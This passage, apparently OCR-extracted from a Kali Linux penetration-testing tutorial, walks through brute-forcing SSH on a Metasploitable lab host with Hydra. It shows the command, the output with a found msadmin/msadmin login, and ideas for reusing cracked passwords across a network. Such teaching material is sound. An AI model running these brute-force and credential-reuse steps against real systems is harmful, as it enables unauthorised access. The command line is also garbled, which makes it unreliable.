- img_proc: true
  md: 'work against.

    So, if we want to attack the SSH service with our newly created passwords, we
    could do something like this:


    ```

    rootkali:~/Desktop hydra -L user -P 192.168.198.145 ssh

    Hydra v7.5 (c)2013 by van Hauser/Thc Maciejak - for legal purposes

    Hydra (http://www.thc.org/the-hydra) starting at 2013-11-02 16:35:44

    [DATA] 16 tasks, 1 server, 81 login tries (1:9:5), -5 tries per task

    [DATA] attacking service ssh on port 22

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    [ERROR] ssh protocol error

    KALI LINUX

    The quicker you become, the more you are able to hear

    [] host:192.168.198.145 login: msadmin password: msadmin

    1 target successfully completed, 1 valid password found

    Hydra (http://www.thc.org/the-hydra) finished at 2013-11-02 16:36:02

    rootkali:~/Desktop #

    ```


    The“-L” lists our username file, “user” in this case. The “-P” switch is the location
    of our password file, or “pass” in this case. Then we just list the target IP
    address and the target service and that is it!


    (You can use Hydra-GTK from the Online Password attack menu if you prefer a graphical
    interface)


    As you can see we found the right combination of username and password pretty
    quick:


    msadmin/ msadmin


    Though it is kind of silly trying a small list of passwords that we already know,
    the concept is solid. Without having any of the actual passwords we could use
    hydra with a large username and password dictionary file to try to brute force
    our way into the server.


    # Conclusion


    That is all there too. Because we had a root shell, we were able to grab the Linux
    password hashes from simply copying and pasting them to our local machine. We
    were then able to use John Ripper to crack them.


    If you take a good look at the Metasploit service scanner programs mentioned in
    an earlier tutorial, you probably noticed some a place to set usernames and passwords.
    How would it be to just feed our newly cracked passwords into these scanners and
    unleash them on the Metasploitable box?


    Also, as many times use the same passwords on other boxes, we could use the same
    scanners to target the whole network address space to see how many others we could
    get access to!


    If the Linux administrator has updated his system software, or even used complex
    passwords this would have been much harder, if not impossible to do.'
